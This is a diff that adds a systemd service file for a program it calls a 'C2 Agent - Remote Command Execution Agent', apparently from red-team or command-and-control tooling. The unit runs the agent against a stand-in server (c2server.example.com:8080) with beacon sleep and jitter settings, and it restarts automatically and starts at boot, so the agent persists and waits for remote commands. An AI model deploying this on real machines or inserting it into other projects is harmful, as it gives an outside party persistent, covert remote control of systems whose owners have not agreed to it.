@@ -1,0 +1,22 @@
+[Unit]
+Description=C2 Agent - Remote Command Execution Agent
+After=network.target
+
+[Service]
+Type=simple
+User=c2agent
+Group=c2agent
+WorkingDirectory=/opt/c2
+ExecStart=/opt/c2/c2-agent --server http://c2server.example.com:8080 --sleep 60000 --jitter 0.3
+Restart=always
+RestartSec=10
+StandardOutput=journal
+StandardError=journal
+SyslogIdentifier=c2-agent
+
+# Security hardening
+NoNewPrivileges=true
+PrivateTmp=true
+
+[Install]
+WantedBy=multi-user.target
